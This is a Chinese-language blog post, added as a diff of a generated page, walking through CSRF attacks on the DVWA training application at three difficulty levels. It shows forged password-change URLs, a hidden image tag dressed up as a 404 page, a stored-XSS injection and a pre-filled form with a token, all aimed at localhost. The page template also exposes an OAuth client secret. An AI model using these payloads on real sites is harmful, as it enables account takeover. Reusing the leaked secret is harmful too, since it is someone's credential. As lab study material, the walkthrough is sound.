@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      DVWA_CSRF | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>DVWA_CSRF</h2>
+  <p class="post-date">2018-12-27 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h2 id="前沿"><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h2><blockquote>
+<blockquote>
+<blockquote>
+</blockquote>
+<p>CSRF，跨站请求伪造，区别与XSS。CSRF直接利用用户cookie进行非法操作，如转账，改密</p>
+<blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>分析源码可知，创建非法链接<br><a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#</a><br>当用户点击该链接直接修改密码成功<br><img src="./1.png" alt=""><br><img src="./2.png" alt=""></p>
+<h3 id="隐匿非法url"><a href="#隐匿非法url" class="headerlink" title="隐匿非法url"></a>隐匿非法url</h3><p>1）url地址缩短<br>2)构造有效的test.html网页，将url放入标签中自动触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;1&amp;password_conf&#x3D;1&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2</span><br></pre></td></tr></table></figure>
+
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><img src="./3.png" alt=""><br>1）从medium源码可以得出，修改密码需满足请求用户的网址与host相同。<br>构造可以通过本机去访问带有目标IP地址的网页 。<br>使用eregi检验HOST 是否与 请求的REFFER参数值相等（即验证是否为同一个用户访问），相同则修改密码。<br>方法：<br>创建有效test.html页面，将html网页命名为被攻击者IP地址。试图使得被攻击者点击该文件。使得密码修改成功</p>
+<p>2)将<code>&lt;img src=&quot;/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#&quot;&gt;</code>放于stored xss中<br>也能够达成修改密码的目的</p>
+<ol>
+<li>捕捉修改密码的GET请求路径<code>/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#</code></li>
+<li>在stored xss&gt;&gt;NAME值中填入<code>&lt;img src=&quot;/DVWA/vulnerabilities/csrf/?password_new=12345&amp;password_conf=12345&amp;Change=Change#&quot;&gt;</code></li>
+</ol>
+<p>当用户访问评论区时，密码就被我们修改了。达到攻击者的目的<br><img src="./5.png" alt=""><br><img src="./6.png" alt=""><br><img src="./7.png" alt=""></p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>HIGH等级中加入Anti-CSRF机制。具体可以看我的机制内容可以看我下面的博客。<br>所以我们要在服务器端放置能获取用户token的恶意代码。并执行修改密码操作<br>创建表单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;zlzhidao&#x2F;vulnerabilities&#x2F;csrf&#x2F;&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">			New password:&lt;br &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;password&quot; AUTOCOMPLETE&#x3D;&quot;on&quot; name&#x3D;&quot;password_new&quot; value&#x3D;&quot;123456&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">			Confirm new password:&lt;br &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;password&quot; AUTOCOMPLETE&#x3D;&quot;on&quot; name&#x3D;&quot;password_conf&quot; value&#x3D;&quot;123456&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">			&lt;br &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Change&quot; name&#x3D;&quot;Change&quot;&gt;</span><br><span class="line">			&lt;input type&#x3D;&#39;hidden&#39; name&#x3D;&#39;user_token&#39; value&#x3D;&#39;e86256b6638005a27e64693e8fcd20be&#39; &#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+<p>保存文件名为test.html<br>使得test.html在目前网页打开。即可修改密码成功<br><img src="./8.png" alt=""><br>当然我们得使用社工等手段来获取token值，或者通过stored xss也是行的通的</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CSRF" >
+    <span class="tag-code">CSRF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2018/12/27/DVWA%E7%B3%BB-Command-Injection/">
+        <span class="nav-arrow">← </span>
+        
+          DVWA_(Command Injection)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2018/12/28/DVWA-FILE-inclusion-uploads/">
+        
+          DVWA_(FILE inclusion&amp;uploads)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#前沿"><span class="toc-nav-text">前沿</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#LOW"><span class="toc-nav-text">LOW</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#隐匿非法url"><span class="toc-nav-text">隐匿非法url</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#medium"><span class="toc-nav-text">medium</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#high"><span class="toc-nav-text">high</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2018/12/27/DVWA-CSRF/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "DVWA_CSRF",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
